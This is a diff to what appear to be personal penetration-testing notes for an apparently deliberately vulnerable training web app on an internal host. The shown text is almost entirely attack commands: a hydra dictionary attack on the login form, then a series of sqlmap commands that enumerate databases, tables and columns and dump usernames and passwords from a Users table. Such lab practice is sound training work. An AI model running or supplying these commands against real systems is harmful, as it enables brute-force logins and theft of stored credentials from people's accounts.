@@ -22,3 +22,13 @@ information_schema: table_schema, table_name
 # Username Enumeration dictionary attack
 
 hydra dvwc.el.eee.intern -V -l urs -P /usr/share/dirb/wordlists/small.txt http-post-form "/login/:username=^USER^&pwd=^PASS^:F=korrekt"
+
+# sql-injection with sql-map
+
+sqlmap -u http://dvwc.el.eee.intern/login --data="pwd=p;form=submit" --method POST --dbs --batch
+
+sqlmap -u http://dvwc.el.eee.intern/login --data="pwd=p;form=submit" --method POST -D dvwc --tables --batch
+
+sqlmap -u http://dvwc.el.eee.intern/login --data="pwd=p;form=submit" --method POST -D dvwc -T Users --columns --batch
+
+sqlmap -u http://dvwc.el.eee.intern/login --data="pwd=p;form=submit" --method POST -D dvwc -T Users -C username,pwd --dump --batch
